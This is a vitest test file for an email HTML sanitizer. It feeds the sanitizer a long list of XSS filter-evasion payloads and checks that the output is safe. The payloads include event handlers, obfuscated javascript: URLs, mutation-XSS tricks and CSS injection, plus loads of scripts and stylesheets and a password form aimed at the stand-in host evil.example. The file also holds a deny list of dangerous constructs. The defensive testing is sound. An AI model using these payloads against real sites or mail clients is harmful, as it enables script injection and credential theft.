import { describe, expect, it } from "vitest";
import { sanitizeEmailHtml } from "./index";

const clean = (h: string, o = {}) => sanitizeEmailHtml(h, o).html;

/** Dangerous constructs that must never appear in output. */
const DANGER: [string, RegExp][] = [
  ["event handler attribute", /<[^>]*\son[a-z]+\s*=/i],
  ["onerror", /onerror/i],
  ["onload", /onload/i],
  ["javascript:", /javascript:/i],
  ["vbscript:", /vbscript:/i],
  ["<script", /<script/i],
  ["<iframe", /<iframe/i],
  ["<svg", /<svg/i],
  ["<math", /<math/i],
  ["<object", /<object/i],
  ["<embed", /<embed/i],
  ["<form", /<form/i],
  ["<input", /<input/i],
  ["<base", /<base/i],
  ["<meta", /<meta/i],
  ["<link", /<link/i],
  ["<noscript", /<noscript/i],
  ["srcdoc", /srcdoc/i],
  ["expression(", /expression\s*\(/i],
  ["data:text", /data:text/i],
  ["@import", /@import/i],
  ["-moz-binding", /-moz-binding/i],
  ["behavior", /behavior/i],
  ["comment", /<!--/],
];

function assertSafe(out: string) {
  for (const [name, re] of DANGER) {
    if (re.test(out)) throw new Error(`output contains ${name}: ${out}`);
  }
}

const XSS: [string, string][] = [
  ["img onerror", `<img src=x onerror=alert(1)>`],
  ["img onerror quoted", `<IMG SRC="x" ONERROR="alert('XSS')">`],
  ["svg onload", `<svg onload=alert(1)>`],
  ["svg/onload", `<svg/onload=alert(1)>`],
  ["body onload", `<body onload=alert(1)>hi</body>`],
  ["javascript href", `<a href="javascript:alert(1)">x</a>`],
  ["javascript mixed case", `<a href="JaVaScRiPt:alert(1)">x</a>`],
  ["javascript decimal entities", `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>`],
  ["javascript padded decimal no semicolons", `<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)">x</a>`],
  ["javascript hex entities no semicolons", `<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)">x</a>`],
  ["jav&#x09;ascript", `<a href="jav&#x09;ascript:alert(1)">x</a>`],
  ["jav&#x0A;ascript", `<a href="jav&#x0A;ascript:alert(1)">x</a>`],
  ["jav&#x0D;ascript", `<a href="jav&#x0D;ascript:alert(1)">x</a>`],
  ["literal tab", `<a href="jav\tascript:alert(1)">x</a>`],
  ["literal newline", `<a href="java\nscript:alert(1)">x</a>`],
  ["&Tab; &colon;", `<a href="java&Tab;script&colon;alert(1)">x</a>`],
  ["&NewLine;", `<a href="java&NewLine;script&colon;alert(1)">x</a>`],
  ["leading control chars", `<a href=" &#14;  javascript:alert(1)">x</a>`],
  ["NUL inside scheme", `<a href="java\0script:alert(1)">x</a>`],
  ["vbscript", `<a href="vbscript:msgbox(1)">x</a>`],
  ["data:text/html href", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`],
  ["img javascript src", `<img src="javascript:alert(1)">`],
  ["img svg data uri", `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`],
  ["nested script", `<scr<script>ipt>alert(1)</scr</script>ipt>`],
  ["unclosed script", `<script>alert(1)`],
  ["script with attributes", `<script type="text/javascript" src="https://evil.example/x.js"></script>`],
  ["EOF inside tag", `<img src=x onerror=alert(1)`],
  ["unquoted attribute", `<img src=x onerror=alert(1)//>`],
  ["backtick quotes", "<img src=`x` onerror=`alert(1)`>"],
  ["slash separators", `<img/src=x/onerror=alert(1)>`],
  ["no space after quote", `<img src="x"onerror="alert(1)">`],
  ["style @import", `<style>@import url(https://evil.example/x.css); p{color:red}</style>`],
  ["style @import string", `<style>@import "https://evil.example/x.css";</style>`],
  ["expression() inline", `<div style="width: expression(alert(1))">x</div>`],
  ["expression split by comment", `<div style="width: expr/**/ession(alert(1))">x</div>`],
  ["expression in sheet", `<style>p{width:expression(alert(1))}</style>`],
  ["url(javascript:)", `<div style="background:url(javascript:alert(1))">x</div>`],
  ["url(&quot;javascript:)", `<div style="background-image:url(&quot;javascript:alert(1)&quot;)">x</div>`],
  ["escaped url function", `<div style="background:u\\72l(javascript:alert(1))">x</div>`],
  ["-moz-binding", `<div style="-moz-binding:url(https://evil.example/x.xml#xss)">x</div>`],
  ["behavior", `<div style="behavior:url(x.htc)">x</div>`],
  ["IE filter progid", `<div style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://evil.example/x')">x</div>`],
  ["base href", `<base href="https://evil.example/"><a href="x">x</a>`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`],
  ["form action", `<form action="https://evil.example/login"><input name=password><button formaction="javascript:alert(1)">Go</button></form>`],
  ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`],
  ["iframe src", `<iframe src="javascript:alert(1)"></iframe>`],
  ["object/embed", `<object data="x.swf"></object><embed src="x.swf">`],
  ["applet", `<applet code="x"></applet>`],
  ["link stylesheet", `<link rel="stylesheet" href="https://evil.example/x.css">`],
  ["mXSS noscript", `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`],
  ["mXSS math mglyph style", `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`],
  ["mXSS svg style", `<svg><style><img src=x onerror=alert(1)></style></svg>`],
  ["mXSS form/math", `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`],
  ["empty comment trick", `<!--><img src=x onerror=alert(1)>-->`],
  ["--!> comment end", `<!-- x --!><img src=x onerror=alert(1)>`],
  ["conditional comment", `<!--[if mso]><v:rect onclick="alert(1)"><![endif]--><p>hi</p>`],
  ["title breakout", `<title></title><img src=x onerror=alert(1)></title>`],
  ["textarea breakout", `<textarea><img src=x onerror=alert(1)></textarea>`],
  ["style breakout string", `<style>p{content:"</style><img src=x onerror=alert(1)>"}</style>`],
  ["xmp", `<xmp><img src=x onerror=alert(1)></xmp>`],
  ["plaintext", `<plaintext><img src=x onerror=alert(1)>`],
  ["template", `<template><img src=x onerror=alert(1)></template>`],
  ["video/audio", `<video><source onerror=alert(1)></video><audio src=x onerror=alert(1)>`],
  ["marquee", `<marquee onstart=alert(1)>x</marquee>`],
  ["details ontoggle", `<details open ontoggle=alert(1)>x</details>`],
  ["isindex", `<isindex type=image src=1 onerror=alert(1)>`],
  ["image tag", `<image src=x onerror=alert(1)>`],
  ["namespaced tag", `<x:script>alert(1)</x:script><o:p onclick=alert(1)>x</o:p>`],
  ["table background javascript", `<table background="javascript:alert(1)"><tr><td>x</td></tr></table>`],
  ["doctype + PI + CDATA", `<!DOCTYPE html><?xml version="1.0"?><![CDATA[<script>alert(1)</script>]]>`],
];

describe("XSS filter evasion", () => {
  for (const [name, h] of XSS) {
    it(name, () => {
      assertSafe(clean(h));
      assertSafe(clean(h, { blockRemoteContent: false }));
    });
  }

  it("unwraps unknown tags but keeps their text", () => {
    expect(clean(`<marquee>Hello</marquee>`)).toBe("Hello");
    expect(clean(`<o:p>Outlook</o:p>`)).toBe("Outlook");
  });

  it("escapes text and keeps encoded markup encoded", () => {
    expect(clean(`&lt;script&gt;alert(1)&lt;/script&gt; 1 < 2 & 3`)).toBe("&lt;script&gt;alert(1)&lt;/script&gt; 1 &lt; 2 &amp; 3");
  });

  it("escapes attribute values", () => {
    const out = clean(`<a title='x" onmouseover="alert(1)' href="https://ok.example">x</a>`);
    expect(out).toMatch(/^<a title="[^"]*" href=/);
    expect(out).toContain('title="x&quot; onmouseover=&quot;alert(1)"');
  });

  it("drops input data-* attributes so data-lac-src cannot be spoofed", () => {
    const out = clean(`<img src="cid:a" data-lac-src="javascript:alert(1)" data-x="1">`);
    expect(out).not.toMatch(/data-lac-src|data-x/);
  });

  it("drops srcset, xmlns, formaction, usemap", () => {
    const out = clean(`<img src="data:image/png;base64,iVBORw0KGgo=" srcset="https://evil.example/a.png 2x" xmlns="x" usemap="#m">`);
    expect(out).not.toMatch(/srcset|xmlns|usemap/);
  });

  it("removes file:, about:, blob: and relative hrefs", () => {
    for (const href of ["file:///etc/passwd", "about:blank", "blob:https://x/1", "/settings/delete", "settings"]) {
      expect(clean(`<a href="${href}">x</a>`)).toBe("<a>x</a>");
    }
  });

  it("prefixes ids and names against DOM clobbering", () => {
    const out = clean(`<div id="getElementById"><a name="cookie">x</a><span class="hidden fixed">y</span></div>`);
    expect(out).toContain('id="m-getElementById"');
    expect(out).toContain('name="m-cookie"');
    expect(out).toContain('class="m-hidden m-fixed"');
    expect(clean(`<form name="x"><input name="y"></form>`)).toBe("");
  });

  it("rewrites in-message anchors to the prefixed ids", () => {
    expect(clean(`<a href="#top">up</a>`)).toBe('<a href="#m-top">up</a>');
  });

  it("drops position:fixed/sticky and clamps z-index", () => {
    const out = clean(`<div style="position:fixed;top:0;z-index:2147483647;color:red">x</div><div style="position: -webkit-sticky">y</div>`);
    expect(out).toBe('<div style="top:0;z-index:100;color:red">x</div><div>y</div>');
  });

  it("refuses selectors that escape the scope", () => {
    const r = sanitizeEmailHtml(`<style>~ .app{display:none} body + div{display:none} body ~ * {color:red} & .x{color:red}</style>`);
    expect(r.html).toBe("");
  });

  it("never emits a literal < inside the generated style element", () => {
    const out = clean(`<style>p{content:"<\\/style>"} p::after{content:"<b>"}</style>`);
    const css = out.slice("<style>".length, out.indexOf("</style>"));
    expect(css).not.toContain("<");
  });

  it("does not let CSS escapes or comments hide a selector-list comma", () => {
    for (const css of [`a\\(, body{color:red}`, `.a\\/* , body{color:red} */{}`, `a/**/,/**/body{color:red}`]) {
      const out = clean(`<style>${css}</style>`);
      const sheet = out.slice(7, out.indexOf("</style>"));
      for (const rule of sheet.split("\n")) {
        const sel = rule.slice(0, rule.indexOf("{"));
        for (const part of sel.split(",")) expect(part.trim().startsWith(".mail-body"), out).toBe(true);
      }
    }
  });

  it("keeps identifier escapes used by utility-class emails", () => {
    expect(clean(`<style>.sm\\:w-full{width:100%}</style>`)).toBe("<style>.mail-body .m-sm\\:w-full{width:100%}</style>");
  });

  it("drops declarations with unterminated strings", () => {
    const out = clean(`<style>p{content:"</style><p>x</p>`);
    expect(out).toBe("<p>x</p>");
  });

  it("drops unknown CSS functions (image-set, attr, element)", () => {
    for (const v of [`image-set("https://e.example/a.png" 1x)`, `attr(data-x url)`, `element(#x)`, `paint(x)`]) {
      expect(clean(`<div style="background-image:${v.replace(/"/g, "&quot;")}">x</div>`)).toBe("<div>x</div>");
    }
  });
});
